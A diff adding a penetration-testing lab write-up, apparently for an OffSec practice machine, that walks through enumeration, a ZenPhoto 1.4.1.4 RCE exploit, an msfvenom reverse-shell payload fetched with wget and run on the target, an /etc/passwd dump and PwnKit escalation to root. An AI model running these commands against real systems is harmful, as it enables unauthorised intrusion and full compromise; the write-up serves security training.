@@ -1,0 +1,118 @@
+192.168.186.41
+
+TODO:
+	[+] Found 2 ports running http, use feroxbuster on both
+	[+] Enumerate /test/ directory endpoints
+	[+] Find zenphoto version number (zenphoto version 1.4.1.4 [8157] (Official Build))
+	[+] Find zenphoto 1.4.1.4 exploit on searchsploit
+	[+] Get web shell with exploit
+	[+] Get reverse shell
+	[-] Investigate admin.php login page
+	[-] Look for LFI
+	[-] Connect to MySQL with default creds
+
+CREDS:
+	
+
+--------------------------SCANNING--------------------------
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp   open  ipp     CUPS 1.4
+|_http-server-header: CUPS/1.4
+|_http-title: 403 Forbidden
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS POST PUT
+|_  Potentially risky methods: PUT
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+3306/tcp open  mysql   MySQL (unauthorized)
+
+--------------------------MySQL Enum--------------------------
+Didn't allow connections from my IP
+-> From inside rev shell, -u root -p '' was wrong
+
+--------------------------WEB ENUM--------------------------
+feroxbuster -u http://192.168.186.41:23 -w /usr/share/wordlists/dirb/common.txt -t 40
+-> didn't find much here
+
+feroxbuster -u http://192.168.186.41 -w /usr/share/wordlists/dirb/common.txt -t 40
+-> landing site under construction, but many accessible endpoints under /test/ directory
+-> Enumerating...
+-> Found /test/robots.txt:
+	Disallow: /test/albums/ (empty)
+	Disallow: /test/cache/ (empty) 
+	Disallow: /test/themes/ -> accessing dirs here brings us to blank pages...
+	Disallow: /test/zp-core/ -> leads to admin.php login page for zenphoto
+	Disallow: /test/zp-data/ -> contains security files, but forbidden (possibly included
+				    files tho, cuz zp-config.php opens to blank screen) 
+	Disallow: /test/page/search/ (not found)
+	Disallow: /test/uploaded/ -> (empty) possible point to access uploaded web shells
+-> zp seems to stand for zenphoto
+-> zenphoto version 1.4.1.4 [8157] (Official Build) <- found in src code of /test
+
+Searching exploit for zenphoto 1.4.1.4
+-> Found RCE exploit
+-> trying it out...
+-> exploit worked with
+	php 18083.php 192.168.186.41 /test/ 
+web shell!!
+
+Time to get reverse shell
+-> Checked target archi with "uname -m"
+	i686 => x86
+-> Crafting payload with msfvenom
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.159 LPORT=443 -f elf -o shelly.elf
+-> Set up penelope 443
+-> Transferred shelly.elf to target
+-> Time to run it...
+zenphoto-shell# wget http://192.168.45.159/shelly.elf -O /tmp/shelly.elf
+zenphoto-shell# chmod +x /tmp/shelly.elf
+zenphoto-shell# /tmp/shelly.elf
+
+Shell popped on penelope!! Logged in as www-data & found local.txt in /home
+
+--------------------------SYSTEM ENUM--------------------------
+dumped /etc/passwd
+couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash
+speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+mysql:x:116:123:MySQL Server,,,:/var/lib/mysql:/bin/false
+-> interesting entries
+
+manual enumeration:
+-> check sudo -l (don't know password, cldnt continue)
+-> check crontab, only got hourly job, not likely the path
+auto enumeration:
+ran lse.sh
+-> target vuln to pwnkit!
+
+--------------------------SYSTEM PRIVESC--------------------------
+proceeding with pwnkit...
+transferred PwnKit over and chmod +x PwnKit, but it could not execute...
+-> cuz PwnKit is a 64bit binary, looking for 32bit one now
+-> Downloaded PwnKit32 from GitHub, and transferred to target machine...
+$---bling bling---$
+www-data@offsecsrv:/tmp$ chmod +x PwnKit32
+www-data@offsecsrv:/tmp$ id   
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@offsecsrv:/tmp$ ./PwnKit32
+expr: syntax error
+root@offsecsrv:/tmp# id
+uid=0(root) gid=0(root) groups=33(www-data)
+root@offsecsrv:/tmp# cd /root
+root@offsecsrv:~# cat proof.txt
+095fd61a941266ea39e5236fcb3c8b24
+$---bling bling---$
+
+--------------------------SUMMARY--------------------------
+Exposed test endpoint -> outdated ZenPhoto service exploit -> system level code execution on webshell -> AV disabled did not detect reverse shell payload added -> outdated polkit (policy kit) vuln to PwnKit -> full system compromise with root access
+
+
+Key Takeaways:
+1. Always look for version numbers!
+2. Keep OS architecture in mind when choosing binaries & payloads
+3. Keep software updated to avoid being vulnerable to known exploits
